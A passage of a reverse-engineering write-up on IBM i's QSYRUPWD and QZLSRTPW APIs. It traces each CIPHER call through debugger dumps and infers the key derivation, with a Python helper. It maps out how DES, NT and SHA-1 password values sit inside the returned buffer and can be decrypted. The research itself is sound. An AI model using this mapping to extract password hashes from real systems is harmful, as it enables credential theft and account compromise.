EAE0    80000000 00000000      D9818947 EC00EB10
EAF0    00000000 00000000      00000000 00000000
EB00    00000000 00000000      00000000 00000000
EB10    00000000 00000000      00000000 00000000
EB20    00000000 00000000      00000000 00000000
EB30    00000000 00000000      00000000 00000000
EB40    00000000 00000000      00000000 00000000
EB50    00000000 00000000      00000000 00000000
EB60    00000000 00000000      00000000 00000000
EB70    00000630 00000000      00000000 00000000
EB80    00000000 00000000      00000020 00000000
EB90    98000000 00000000      05E08100 46010000
EBA0    00000000 00000000      00000000 00000000
EBB0    00000000 00000000      00000000 00000000
EBC0    00000000 00000000      0000D800 00000000
```

According to the CIPHER documentation, it does this:

```sql
Offset 0x00–0x01 (Function identifier): 0x0005 (one-way hash / HMAC)
Offset 0x02 (Hash algorithm): 0x00 (MD5)
Offset 0x03 (Sequence): 0x00 (Only)
Offset 0x04–0x07 (Data length, UBin(4)): 0x0000000A (10 bytes)
Offset 0x08 (Output): 0x00 (Hash)
Offset 0x09–0x0F (Reserved/ignored, 7 bytes): 00000000000000
Offset 0x10–0x1F (Hash context, space pointer, 16 bytes): 8000000000000000D9818947EC00EB10
Offset 0x20–0x2F (HMAC key, space pointer, 16 bytes): 00000000000000000000000000000000 (NULL)
Offset 0x30–0x33 (HMAC key length, UBin(4)): 0x00000000
Offset 0x34–0x5F (Reserved/ignored padding until the end of the 96-byte control area): (NULL)
```

GPR 5 (CIPHER input): In the memory area pointed by R5, the following pointer can be found:

```
E8A0    80000000 00000000      D9818947 EC00E870
```

In the memory area referred by the pointer above, the following data is stored:

```
E870    E4E2C5D9 C2F14040      40404040 40404040    // USERB1 (username)
```

The input contains the EBCDIC username padded with spaces (0x40) to 10 characters. The CIPHER runs MD5 on the input and creates the following result:

```
EA60    0843AD67 CD610BFD      A2B47D19 6DBE0698
EA70    0843AD67 CD610BFD      A2B47D19 6DBE0698
EA80    00000000 002F4040      40404040 40404040
```

The receiver memory area contains the MD5 result twice. I validated the crypto operation by hand and the result was identical:

```
0843AD67CD610BFDA2B47D196DBE0698
```

#### QZLSRTPW 3rd CIPHER

Continuing the debugging cycles, the next target was the 3rd SVC 10 function:

```
235B8A8762 0027C4     000704    3940015A          ADDI 10,0,346
235B8A8762 0027C8     000708    44000141          SCV 10                                // 3. CIPHER
235B8A8762 0027CC     00070C    E8410020          LD 2,0X20(1)
```

At the breakpoint, the relevant general purpose registers contained the following addresses:

```
GPR 3     D9818947EC 00E880
GPR 4     D9818947EC 00EB70
GPR 5     D9818947EC 00E890
```

GPR 3 (CIPHER receiver/output): In the memory area pointed by R3, the following pointer can be found:

```
E880    80000000 00000000      D9818947 EC00CC60
```

GPR 4 (CIPHER struct): In the memory area pointed by R4:

```
EB70    001600C0 00012000      0843AD67 CD610BFD
EB80    A2B47D19 6DBE0698      0843AD67 CD610BFD
EB90    A2B47D19 6DBE0698      00000000 00000020
EBA0    00000000 00000000      00000000 00000000
EBB0    00000000 002F4040      40404040 40404040
EBC0    40404445 75858894      A7C2C5D9 E2E4F1F6
EBD0    0000E700 00000000      00000000 00000000
EBE0    00000008 00000000      00000200 00000002

Offset 0x00–0x01 (Function identifier): 0x0016 (Rijndael)
Offset 0x02–0x03 (Data length, UBin(2)): 0x00C0 (192 bytes)
Offset 0x04 (Operation): 0x00 (Encrypt)
Offset 0x05 (Mode): 0x01 (CBC)
Offset 0x06 (Block length): 0x20 (32 bytes) (supported: 0x10/0x18/0x20)
Offset 0x07 (MAC length): 0x00
Offset 0x08–0x27 (Initialization vector, 32 bytes):0843AD67CD610BFDA2B47D196DBE06980843AD67CD610BFDA2B47D196DBE0698
Offset 0x28–0x2E (Reserved, 7 bytes): 00000000000000
Offset 0x2F (Key option): 0x20 (Use 32-byte key)
Offset 0x30–0x3F (Key schedule pointer, space pointer 16 bytes): 00000000000000000000000000000000 
Offset 0x40–0x5F (Key, 32 bytes, left-justified): 00000000002F404040404040404040404040444575858894A7C2C5D9E2E4F1F6
```

The CIPHER structure is the same, but there is something strange, according to the CIPHER documentation there is no 0x0016 CIPHER Function Identifier. Based on the structure above, this cipher is not standard AES. AES always uses a fixed 16-byte (128-bit) block size, but here the block length can be 0x10, 0x18, or 0x20, and the example uses 0x20 (32 bytes). Because the block size is 32 bytes, the CBC initialization vector is also 32 bytes, which matches Rijndael with a 256-bit block size rather than AES. Before I got lost in a rabbit hole, I quickly performed a Rijndael encryption using the structure and compared the result with the SCV 10 function result: My result was:

```
124C5A7DB02D8ACF63F74AA208CB5195 
7A7086ADD7756695C2E347A9CBD0F685 
F70B30C86C0BE8EDBA81D961AD6F9407 
B8A515EB5E2E3B472E5DFE8B84C1CBD3 
38791BC974C0DD90D5E505F4E5124DB1 
D150915577E448A10A86F1E5A8D35333 
17313763B4C60EC1C4E26FA32266195B 
7CAA42D89F384D9069636BB3069B3398 
B01F949E6942108D3BE55081A7AA61BC 
F15B8094C4372A8B24668CC6B96DEEE1 
D167EE159904700A6BF4726CF2DCC549 
85BBB0F489ECB6193B4841CE617D93A6
```

Dumped result from memory after the CIPHER function:

```
CC60    124C5A7D B02D8ACF      63F74AA2 08CB5195
CC70    7A7086AD D7756695      C2E347A9 CBD0F685
CC80    F70B30C8 6C0BE8ED      BA81D961 AD6F9407
CC90    B8A515EB 5E2E3B47      2E5DFE8B 84C1CBD3
CCA0    38791BC9 74C0DD90      D5E505F4 E5124DB1
CCB0    D1509155 77E448A1      0A86F1E5 A8D35333
CCC0    17313763 B4C60EC1      C4E26FA3 2266195B
CCD0    7CAA42D8 9F384D90      69636BB3 069B3398
CCE0    B01F949E 6942108D      3BE55081 A7AA61BC
CCF0    F15B8094 C4372A8B      24668CC6 B96DEEE1
CD00    D167EE15 9904700A      6BF4726C F2DCC549
CD10    85BBB0F4 89ECB619      3B4841CE 617D93A6
```

At this point I realized this result is also a part of the QSYRUPWD API.

The initialization vector is the result of the previous second QZLSRTPW cipher call (MD5), repeated twice in a row (a total 32-byte IV). In CBC mode, it is actually used, and at the end of the operation, it is updated as the output chaining value.

Updated chaining value is (IV field at the end of the operation, 32 bytes):

```
D167EE159904700A6BF4726CF2DCC54985BBB0F489ECB6193B4841CE617D93A6
```

This value is also part of the QSYRUPWD API output.

GPR 5 (CIPHER input): In the memory area pointed by R5, the following pointer can be found:

```
E890    80000000 00000000      D9818947 EC00E9A0
```

In the memory area referred by the pointer above, the following data is stored:

```
E9A0    E4E2C5D9 C2F14040      40400000 00000000    // Username in EBCDIC
E9B0    00000000 00000000      00000000 00000000
E9C0    00000000 00000000      00000000 00000000
E9D0    00000000 00022D8C      32FBB32A 5E438562    // 0002 prefix and NT hash of the plain password twice: NT(password) = MD4( UTF-16LE(password) )
E9E0    9E700A4F 94962D8C      32FBB32A 5E438562
E9F0    9E700A4F 94960000      00000000 00000000
EA00    00000000 00000000      00000000 00000000
EA10    00000000 00000000      00000000 00000000
EA20    00000000 00000000      00000000 00000000
EA30    00000000 00000000      00000000 00000000
EA40    00000000 00000000      00000000 B7ECCA4F    // 1st QZLSRTPW CIPHER (SHA1) result (B7ECCA4FBA7B8DF96BF94C3A40751E3BC319C176)
EA50    BA7B8DF9 6BF94C3A      40751E3B C319C176
```

The CIPHER input structure referenced by R5 contains the current user’s identifier and the hash material needed for the operation. Concretely, it includes the username in EBCDIC (padded with 0x40), a block holding the NT hash value (present twice, preceded by a small prefix), and an embedded 20-byte SHA-1 intermediate result from an earlier CIPHER phase (1st QZLSRTPW CIPHER).

Several observations suggested that the Rijndael key was derived from the current user’s DES password value and username, where a DES password value was available. Because DES-based password material is not available in every case, especially for longer passwords, my first approach was to collect and compare data from multiple users with different password characteristics. These were my samples::

```ruby
USERNAME:PLAIN-PASSWORD -> DES(PLAIN-PASSWORD,USERNAME)                             

A:a -> 0F7DE80335E8ED68
CDE:cde -> C9ECF98EFC0AFB69
EFGH:efgh -> 3F265A7A9A1C0830
B1#@:b1#@ -> E195D358F3028784
LIMIT:limit -> 8EB517E0A04C841F
USERB1:userb1 -> 7585F62F8845A794
PARTIAL:partial -> 743AE610110FF3B8
ABCDEF12:abcdef12 -> 96F733915D3A3456
TMPPANCZZ:31wG6IKr4!wE -> 4040404040404040
TMPPANCZZ:A -> BE21BA0E06A9E3E6

For A:
    EA80    00000000 00030F35      40404040 40404040
    EA90    40404040 40404040      4044687D C1E8E8ED

For CDE:
    EA80    00000000 000A4040      40404040 40404040
    EA90    40404040 4044698E      C3C4C5C9 ECF9FBFC

For EFGH:
    EA80    00000000 00081C26      303F4040 40404040       \* ..........       \*
    EA90    40404040 40404040      445A7A9A C5C6C7C8       \*         à!:ªEFGH \*

For USERB1:                                                                           
    EA80    00000000 002F4040      40404040 40404040       \* ......           \*
    EA90    40404445 75858894      A7C2C5D9 E2E4F1F6       \*   àáÍehmxBERSU16 \*

For USERB2:
    EA80    00000000 00304040      40404040 40404040       \* ......           \*
    EA90    4040444E 59748BA2      B3C2C5C7 D9E2E4F2       \*   à+ßÈ»s·BEGRSU2 \*

For TMPPANCZZ:
    EA80    00000000 00404040      40404040 40404040       \* .....            \*
    EA90    40404040 404044C1      C3D4D5D7 D7E3E9E9       \*       àACMNPPTZZ \*

For LIMIT:
    EA80    00000000 00171F40      40404040 40404040       \* .......          \*
    EA90    40404040 444C848E      A0B5C9C9 D3D4E0E3       \*     à<dþµ§IILM\T \*

For PARTIAL:
    EA80    00000000 000F1011      3A404040 40404040       \* .........        \*
    EA90    40404040 4474B8C1      C1C9D3D7 D9E3E6F3       \*     àÈ½AAILPRTW3 \*

For ABCDEF12:
    EA80    00000000 0033343A      40404040 40404040       \* ........         \*
    EA90    40404456 5D9196C1      C2C3C4C5 C6F1F2F7       \*   àî)joABCDEF127 \*

For B1#@:
    EA80    00000000 00024040      40404040 40404040       \* ......           \*
    EA90    40404040 44587B7C      848795C2 D3E1F1F3       \*     àì#@dgnBL÷13 \*

For TMPPANCZZ with password "A":
    EA80    00000000 00060E21      40404040 40404040       \* ........         \*
    EA90    4044A9BA BEC1C3D4      D5D7D7E3 E3E6E9E9       \*  àz[´ACMNPPTTWZZ \*
```

If `QPWDLVL = 2` and the password is longer than 8 characters, the DES-derived part disappears and is replaced with 0x40 bytes, while the username-derived part remains. This was an important clue that the transformation mixes two inputs: the username and, when available, the legacy 8-byte DES password value. After collecting multiple samples across different users and passwords and correlating the DES-derived values with the in-memory buffers, I was able to infer the transformation used to build the 32-byte structure. The two inputs are:

-   the username in EBCDIC (`cp037`), padded with 0x40
-   `des8`, the 8-byte legacy DES password value, when such a value exists

In other words, `des8` is not an arbitrary 8-byte field: it is the DES-derived password value associated with the user. If that DES value is unavailable, for example because the password no longer fits the legacy DES scheme, the DES-derived portion of the structure is replaced with 0x40 bytes and only the username-derived component remains visible. Here is the algorithm:

```python
Input:
  username_ebcdic  = username in EBCDIC (cp037), padded with 0x40
  des8             = 8-byte legacy DES password value, if available

1) Trim the username
   U = rstrip(username_ebcdic, 0x40)

   Remove trailing EBCDIC space bytes from the username.

2) Partition the DES bytes and sort both groups
   L = sort_bytes({ b in des8 | b < 0x40 })
   H = sort_bytes({ b in des8 | b >= 0x40 })

   The 8 bytes of des8 are divided into two groups using 0x40 as the threshold.
   Bytes below 0x40 form L, and bytes greater than or equal to 0x40 form H.
   Both groups are then sorted in ascending byte order.

3) Build the 16-byte head
   if len(L) > 11: L = L[0:11]
   head = 0x00 * 5 || L || pad_right(0x40, until_len = 11)

   The head is always 16 bytes long:
   - 5 zero bytes
   - followed by up to 11 sorted low DES bytes
   - padded on the right with 0x40 if needed

4) Build the tail payload
   P = sort_bytes(U || H)

   Concatenate the trimmed username bytes with the sorted high DES bytes,
   then sort the combined byte sequence in ascending byte order.

5) Build the 16-byte tail
   tail_raw = 0x44 || P
   tail = pad_left(0x40, tail_raw, to_len = 16)
   if len(tail_raw) > 16: keep only the rightmost 16 bytes

   The tail is always 16 bytes long.
   It consists of a fixed marker byte 0x44 followed by the sorted payload,
   then normalized to 16 bytes.

Output:
   struct = head || tail
```

The result is a deterministic 32-byte structure. Its first half preserves only the low (< 0x40) bytes of the legacy DES password value, while the second half is derived from the sorted combination of the trimmed username bytes and the high (>= 0x40) DES bytes. When the legacy DES password value is unavailable, the DES-derived part disappears and only the username-derived component remains.

I wrote a simple Python script to validate this inferred transformation. In the script below, des8 refers to the 8-byte legacy DES password value:

```python
def build_struct_ebcdic(username_ebcdic: bytes, des8: bytes) -> bytes:
    if len(des8) != 8:
        raise ValueError("des8 must be exactly 8 bytes")

    # Trim username padding (EBCDIC space 0x40)
    U = username_ebcdic.rstrip(b"\x40")

    # Split DES bytes into low/high
    low = bytes(sorted(b for b in des8 if b < 0x40))
    high = bytes(sorted(b for b in des8 if b >= 0x40))

    # 16-byte head: 0x00 * 5 + low (<=11) + 0x40 padding to 11 
    if len(low) > 11:
        low = low[:11]
    head = (b"\x00" \* 5) + low + (b"\x40" \* (11 - len(low)))

    # Tail payload: sorted(username_trimmed + high_des_bytes)
    payload = bytes(sorted(U + high))

    # 16-byte tail: leftpad16( 0x44 + payload )
    # (keeps last 16 bytes if it would overflow)
    tail_data = b"\x44" + payload
    if len(tail_data) >= 16:
        tail = tail_data[-16:]
    else:
        tail = (b"\x40" * (16 - len(tail_data))) + tail_data

    return head + tail
```

#### QSYRUPWD 1st CIPHER

Continuing the debugging rounds the next target was the 1st SVC 10 function:

```
0523F73E36 004354     002C84    3940015A          ADDI 10,0,346
0523F73E36 004358     002C88    44000141          SCV 10                                // CIPHER (1)
0523F73E36 00435C     002C8C    E8410020          LD 2,0X20(1)
```

At the breakpoint, the relevant general purpose registers contained the following addresses:

```
GPR 3     CA0B861826 00DCA0               
GPR 4     CA0B861826 00D810         
GPR 5     CA0B861826 00DC90
```

GPR 3 (receiver/output): In the memory area pointed by R3, the following pointer can be found:

```
DCA0    80000000 00000000      CA0B8618 2600D3BC
```

GPR 4 (CIPHER struct): In the memory area pointed by R4:

```
D810    00050100 000007B4      00000000 00000000
D820    80000000 00000000      CA0B8618 2600D7B0
D830    00000000 00000000      00000000 00000000
D840    00000000 00000000      00000000 00000000
D850    00000000 00000000      00000000 00000000
D860    00000000 00000000      00000000 00000000
D870    00160000 00000000      00000000 00000000
D880    00000000 00000000      00000000 00000000
D890    00000000 00000000      00000000 00000000
D8A0    00000000 00000000      00000000 00000000
D8B0    00000000 00000000      00000000 00000000
D8C0    00000000 00000000      00000000 00000000
```

According to the CIPHER documentation, it does this:

```sql
Offset 0x00–0x01 (Function identifier): 0x0005 (one-way hash / HMAC)
Offset 0x02 (Hash algorithm): 0x01 (SHA-1)
Offset 0x03 (Sequence): 0x00 (Only)
Offset 0x04–0x07 (Data length, UBin(4)): 0x000007B4 (1972 bytes)
Offset 0x08 (Output): 0x00 (Hash, not HMAC)
Offset 0x09–0x0F (Reserved/ignored, 7 bytes): 00000000000000
Offset 0x10–0x1F (Hash context, space pointer, 16 bytes): 8000000000000000CA0B86182600D7B0
Offset 0x20–0x2F (HMAC key, space pointer, 16 bytes): 00000000000000000000000000000000 (NULL)
Offset 0x30–0x33 (HMAC key length, UBin(4)): 0x00000000
Offset 0x34–0x5F (Reserved/ignored padding until the end of the 96-byte control area): 00000000000000000000000000000000000000000000000000000000000000000000000000000000
```

GPR 5 (CIPHER input): In the memory area pointed by R5, the following pointer can be found:

```
DC90    80000000 00000000      CA0B8618 2600CC08
```

In the memory area referred by the pointer above, the following data is stored:

```javascript
CC00    00000000 000007D0      E4E2C5D9 C2F14040       // 0x7D0 fixed value and EBCDIC username padded with 0x40 to length 10
CC10    40404475 85F62F88      45A79440 40404040       // Fixed value 0x44, then the password is encrypted with DES (7585F62F8845A794)
CC20    40404000 00000000      00000000 00000000       
CC30    00000000 05B89E7B      4BD4159A 06900908       // 0x5 prefix and the SHA-1 value of the password
CC40    F57CA0DB 0D19E840      48000000 00000000       
CC50    00000000 00000000      00000000 000240F0       // fixed value 0x000240F0
CC60    124C5A7D B02D8ACF      63F74AA2 08CB5195       // result of the 3rd QZLSRTPW CIPHER (Rijndael)
CC70    7A7086AD D7756695      C2E347A9 CBD0F685       
CC80    F70B30C8 6C0BE8ED      BA81D961 AD6F9407       
CC90    B8A515EB 5E2E3B47      2E5DFE8B 84C1CBD3       
CCA0    38791BC9 74C0DD90      D5E505F4 E5124DB1       
CCB0    D1509155 77E448A1      0A86F1E5 A8D35333       
CCC0    17313763 B4C60EC1      C4E26FA3 2266195B       
CCD0    7CAA42D8 9F384D90      69636BB3 069B3398       
CCE0    B01F949E 6942108D      3BE55081 A7AA61BC       
CCF0    F15B8094 C4372A8B      24668CC6 B96DEEE1       
CD00    D167EE15 9904700A      6BF4726C F2DCC549        
CD10    85BBB0F4 89ECB619      3B4841CE 617D93A6       // end of the 3rd QZLSRTPW CIPHER (Rijndael)
CD20    04CAA355 1ADF81C7      98A729A2 BDA638F3       // Some user profile data, generated by the SCV in the QSYRUPWD:
CD30    19AC0081 D172B1DC      0629F015 4E13B185       // 523F73E36 003B00     002430    39400012          ADDI 10,0,18
CD40    0F93A99F 6257EA4F      2894B8C4 DBA0E938       // 523F73E36 003B04     002434    44000141          SCV 10
CD50    D099D6E4 1DC20CEF      F8FB74D7 33BF62A6        
CD60    00000000 00000000      00000000 00000000       // the rest is NULL
```

This CIPHER input buffer is a composite structure that includes the user context and several password-related cryptographic values. It starts with a fixed header and the username in EBCDIC (padded with 0x40), followed by a fixed marker (0x44) and the user’s DES password value. Next, it contains a SHA-1 password value with its own prefix (0x5), a fixed marker (0x000240F0), and then a large Rijndael ciphertext block from a previous QZLSRTPW CIPHER phase (including its updated chaining value). The structure also includes additional user profile related data produced by a SCV 10 call, and the remaining space is padded with null bytes. According to the CIPHER control structure, this operation is a plain SHA-1 hash, not an HMAC: the function identifier is 0x0005, the hash algorithm is 0x01 (SHA-1), the output mode is set to hash, the HMAC key pointer is NULL, and the HMAC key length is zero. The hashed input is the 1972-byte buffer referenced through R5, i.e. the composite QSYRUPWD input structure shown above. The resulting 20-byte SHA-1 digest is:

```
4822BDC0C3F143547BE52989CA747F8253B97367
```

#### QSYRUPWD 2nd CIPHER

Continuing the debugging cycles, the next target was the 2nd SVC 10 function:

```
0523F73E36 004524     002E54    3940015A          ADDI 10,0,346
0523F73E36 004528     002E58    44000141          SCV 10                                // CIPHER (2)
0523F73E36 00452C     002E5C    E8410020          LD 2,0X20(1)
```

At the breakpoint, the relevant general purpose registers contained the following addresses:

```
GPR 3     CA0B861826 00DC20               
GPR 4     CA0B861826 00D870         
GPR 5     CA0B861826 00DC00
```

GPR 3 (CIPHER receiver/output): In the memory area referred by R3, the following pointer can be found:

```
DC20    80000000 00000000      CA0B8618 2600DD20
```

GPR 4 (CIPHER struct): In the memory area pointed by R4:

```
D870    00160010 00001000      00000000 00000000
D880    00000000 00000000      00000000 00000000
D890    00000000 00000000      00000000 00000010
D8A0    00000000 00000000      00000000 00000000
D8B0    4822BDC0 F143547B      2989CA74 8253B973 // D[1..4] || D[6..9] || D[11..14] || D[16..19]
D8C0    00000000 00000000      00000000 00000000
```

According to the CIPHER documentation, it does this:

```
Offset 0x00–0x01 (Function identifier): 0x0016 (Rijndael) (Undocumented)
Offset 0x02–0x03 (Data length): 0x0010 (16 bytes)
Offset 0x04 (Operation): 0x00 (Encrypt)
Offset 0x05 (Mode): 0x00 (ECB)
Offset 0x06 (Block length): 0x10 (16 bytes)
Offset 0x07 (MAC length): 0x00 (ignored for Encrypt/Decrypt)
Offset 0x08–0x27 (IV, 32 bytes): 0000000000000000000000000000000000000000000000000000000000000000
Offset 0x28–0x2E (Reserved, 7 bytes): 00000000000000
Offset 0x2F (Key option): 0x10 (Use 16-byte key)
Offset 0x30–0x3F (Key schedule pointer, 16 bytes space pointer): 00000000000000000000000000000000 (NULL)
Offset 0x40–0x5F (Key, 32 bytes, left-justified): 4822BDC0F143547B2989CA748253B97300000000000000000000000000000000
```

This step describes the transformation of the first CIPHER output returned by QSYRUPWD. Using the current test vector, the 20-byte (40 hex characters) result `4822BDC0C3F143547BE52989CA747F8253B97367` is not used as one continuous block, but it is rearranged by taking four separate 4-byte slices from specific offsets. In other words, we build a new 16-byte value by concatenating `D[1..4], D[6..9], D[11..14], and D[16..19]` in this order, meaning we keep bytes 1–4, then skip byte 5, keep bytes 6–9, skip byte 10, keep bytes 11–14, skip byte 15, and finally keep bytes 16–19.

GPR 5 (CIPHER input): In the memory area pointed by R5, the following pointer can be found:

```
DC00    80000000 00000000      CA0B8618 2600CC13
```

In the memory area referred by the pointer above, the following data is stored:

```
CC10    40404475 85F62F88      45A79440 40404040       // Fixed value 0x44, then the password is encrypted with DES (7585F62F8845A794)
```

The `QSYRUPWD` API output contains the result of the first CIPHER function within `QSYRUPWD`. This is important because, at this stage, the process is already chained: the output of the first `QSYRUPWD` CIPHER function is used to derive the key needed for the second `QSYRUPWD` CIPHER function.

#### QSYRUPWD 3rd CIPHER

Continuing the debugging rounds the next target was the 2nd SVC 10 function:

```
0523F73E36 004640     002F70    3940015A          ADDI 10,0,346
0523F73E36 004644     002F74    44000141          SCV 10                                // CIPHER (3)
0523F73E36 004648     002F78    E8410020          LD 2,0X20(1)
```

At the breakpoint, the relevant general purpose registers stored the following addresses:

```
GPR 3     CA0B861826 00DC20               
GPR 4     CA0B861826 00D870         
GPR 5     CA0B861826 00DC00
```

GPR 3 (CIPHER receiver/output): In the memory area pointed by R3, the following pointer can be found:

```
DC20    80000000 00000000      CA0B8618 2600DC10
```

GPR 4 (CIPHER struct): In the memory area pointed by R4:

```
D870    00160010 00001000      00000000 00000000
D880    00000000 00000000      00000000 00000000
D890    00000000 00000000      00000000 00000010
D8A0    00000000 00000000      00000000 00000000
D8B0    53B97367 89CA747F      43547BE5 22BDC0C3 // D[16..19] || D[11..14] || D[6..9] || D[1..4]
D8C0    00000000 00000000      00000000 00000000
```

According to the CIPHER documentation, it does this:

```sql
Offset 0x00–0x01 (Function identifier): 0x0016 (Rijndael) (Undocumented)
Offset 0x02–0x03 (Data length): 0x0010 (16 bytes)
Offset 0x04 (Operation): 0x00 (Encrypt)
Offset 0x05 (Mode): 0x00 (ECB)
Offset 0x06 (Block length): 0x10 (16 bytes)
Offset 0x07 (MAC length): 0x00 (ignored for Encrypt/Decrypt)
Offset 0x08–0x27 (IV, 32 bytes): 000000000000 (32 bytes) ... = all zero
Offset 0x28–0x2E (Reserved, 7 bytes): all zero
Offset 0x2F (Key option): 0x10 (Use 16-byte key)
Offset 0x30–0x3F (Key schedule pointer, 16 bytes space pointer): NULL (all zero)
Offset 0x40–0x5F (Key, 32 bytes, left-justified): 53B9736789CA747F43547BE522BDC0C3 + 00000000000000000000000000000000
```

This variant is the same slice-based reordering described earlier, but applied in reverse order; the input is the output of the `QSYRUPWD` first CIPHER. This implementation concatenates the same four 4-byte blocks starting from the end:

```
D[16..19] || D[11..14] || D[6..9] || D[1..4]
```

The bytes are unchanged; only the block order is inverted. This reordered 16-byte value is used as the crypto key material for this CIPHER operation.

GPR 5 (CIPHER input): In the memory area pointed by R5, the following pointer can be found:

```
DC00    80000000 00000000      CA0B8618 2600CC37
```

In the memory area referred by the pointer above, the following data is stored:

```
CC30    00000000 05B89E7B      4BD4159A 06900908       \* .....½Æ#.M.ª.°.. \*
CC40    F57CA0DB 0D19E840      48000000 00000000       \* 5@µû..Y ç....... \*
```

Based on the memory pointers and the data length field in the CIPHER structure, the input buffer can be identified as the middle portion of the SHA-1 hash of the user’s password.

With the current test data(USERB1:userb1), the input bytes of the CIPHER are (see CIPHER input above):

```
B89E 7B4BD4159A06900908F57CA0DB0D19E8 4048
```

The resulting output of the CIPHER operation for this test case is:

```
ACA7145D3C3277397B3BE11B8AE2CCBB
```

This output matches the middle segment of the larger value:

```
B89E ACA7145D3C3277397B3BE11B8AE2CCBB 4048
```

which is also present in the `QSYRUPWD` API output. This match confirms that the CIPHER step is producing the exact inner block that appears embedded in the final `QSYRUPWD` output.

#### QSYRUPWD 4th CIPHER

In my tests, this CIPHER is not called:

```
0523F73E36 004728     003058    3940015A          ADDI 10,0,346
0523F73E36 00472C     00305C    44000141          SCV 10                                // CIPHER (4)
0523F73E36 004730     003060    E8410020          LD 2,0X20(1)
```

#### QSYRUPWD 5th CIPHER

Continuing the debugging rounds the next target was the `5th SVC 10` function:

```
0523F73E36 004934     003264    3940015A          ADDI 10,0,346
0523F73E36 004938     003268    44000141          SCV 10                                // CIPHER (5)
0523F73E36 00493C     00326C    E8410020          LD 2,0X20(1)
```

At the breakpoint, the relevant general purpose registers contained the following addresses:

```
GPR 3     CA0B861826 00DC20               
GPR 4     CA0B861826 00D870         
GPR 5     CA0B861826 00DC00
```

GPR 3 (CIPHER receiver/output): In the memory area pointed by R3, the following pointer can be found:

```
DC20    80000000 00000000      CA0B8618 2600DA30
```

GPR 4 (CIPHER struct): In the memory area pointed by R4:

```
D870    00160040 00001000      00000000 00000000
D880    00000000 00000000      00000000 00000000
D890    00000000 00000000      00000000 00000010
D8A0    00000000 00000000      00000000 00000000
D8B0    53B97367 4822BDC0      89CA747F F143547B // D[17..20] || D[1..4] || D[12..15] || D[6..9]
D8C0    00000000 00000000      00000000 00000000
```

According to the CIPHER documentation, it does this:

```sql
Offset 0x00–0x01 (Function identifier): 0x0016 (Rijndael) (Undocumented)
Offset 0x02–0x03 (Data length): 0x0040 (64 bytes)
Offset 0x04 (Operation): 0x00 (Encrypt)
Offset 0x05 (Mode): 0x00 (ECB)
Offset 0x06 (Block length): 0x10 (16 bytes)
Offset 0x07 (MAC length): 0x00 (ignored for Encrypt/Decrypt)
Offset 0x08–0x27 (IV, 32 bytes): all zero
Offset 0x28–0x2E (Reserved, 7 bytes): all zero
Offset 0x2F (Key option): 0x10 (Use 16-byte key)
Offset 0x30–0x3F (Key schedule pointer, 16 bytes space pointer): 00000000000000000000000000000000 (NULL)
Offset 0x40–0x5F (Key, 32 bytes, left-justified): 53B973674822BDC089CA747FF143547B00000000000000000000000000000000
```

This variant uses the same slice-based reordering described earlier; the input is the output of the `QSYRUPWD` first CIPHER. This implementation concatenates the same four 4-byte blocks in reverse order:

```
D[17..20] || D[12..15] || D[6..9] || D[1..4]
```

The bytes are unchanged; only the block order is reversed. This reordered 16-byte value is then used as the crypto key material for the next CIPHER operation.

GPR 5 (CIPHER input): In the memory area pointed by R5, the following pointer can be found:

```
DC00    80000000 00000000      CA0B8618 2600CD20
```

In the memory area referred by the pointer above, the following data is stored:

```
CD20    04CAA355 1ADF81C7      98A729A2 BDA638F3 // part of the QSYRUPWD 1st CIPHER input
CD30    19AC0081 D172B1DC      0629F015 4E13B185 // Some user profile data, generated by the following SCV in the QSYRUPWD:
CD40    0F93A99F 6257EA4F      2894B8C4 DBA0E938 // 523F73E36 003B00     002430    39400012          ADDI 10,0,18
CD50    D099D6E4 1DC20CEF      F8FB74D7 33BF62A6 // 523F73E36 003B04     002434    44000141          SCV 10
CD60    00000000 00000000      00000000 00000000
```

Calculated result of the CIPHER:

```
1BEB86A9 D9EE34C1 B4693042 E7FB2A24
608C5A61 A9DA9789 1DE288EF 078CBB07
98ECADAF C988A95F 52A22DE3 07B99274
5236CE92 49D0E60E 3C71C99C C0688F6A
```

The `QSYRUPWD` API output contains both the CIPHER result and the crypto key base value (before the transformation).

### QSYRUPWD structure

All things considered, the `QSYRUPWD` API output structure is as follows, based on the CIPHER functions:

```
000007D0:size1 returned bytes length
000007D0:size2 
E4E2C5D9C2F140404040: Username in EBCDIC, padded to 10 bytes with 0x40.
44:fixed value
8C659794FE63A3F5C16853ACFCB77E7F: Result of the QSYRUPWD 2nd CIPHER
00000000000000000000000000000000000:Zero_1
5:fixed value
B89EACA7145D3C3277397B3BE11B8AE2CCBB4048: Result of the QSYRUPWD 3rd CIPHER
0000000000000000000000000000000000000000:Zero_2
0240F0:fixed value (0x02 if QPWDLVL = 2, 0x04 if QPWDLVL = 4)
124C5A7DB02D8ACF63F74AA208CB51957A7086ADD7756695C2E347A9CBD0F685F70B30C86C0BE8EDBA81D961AD6F9407B8A515EB5E2E3B472E5DFE8B84C1CBD338791BC974C0DD90D5E505F4E5124DB1D150915577E448A10A86F1E5A8D3533317313763B4C60EC1C4E26FA32266195B7CAA42D89F384D9069636BB3069B3398B01F949E6942108D3BE55081A7AA61BCF15B8094C4372A8B24668CC6B96DEEE1: Result of the QZLSRTPW 3rd CIPHER
D167EE159904700A6BF4726CF2DCC54985BBB0F489ECB6193B4841CE617D93A6: Updated chaining value of the QZLSRTPW 3rd CIPHER
1BEB86A9D9EE34C1B4693042E7FB2A24608C5A61A9DA97891DE288EF078CBB0798ECADAFC988A95F52A22DE307B992745236CE9249D0E60E3C71C99CC0688F6A: Result of the QSYRUPWD 5th CIPHER
[1628 zero bytes]:Zero_3
4822BDC0C3F143547BE52989CA747F8253B97367: Result of the QSYRUPWD 1st CIPHER
```

The `QSYRUPWD` API output (with `QPWDLVL = 2`) contains multiple CIPHER results and enough embedded key material to decrypt them. The general approach is to treat the returned buffer as a structured container, extract the relevant encrypted fields, and then apply the same CIPHER chain in the decryption direction, following the original dependency order.

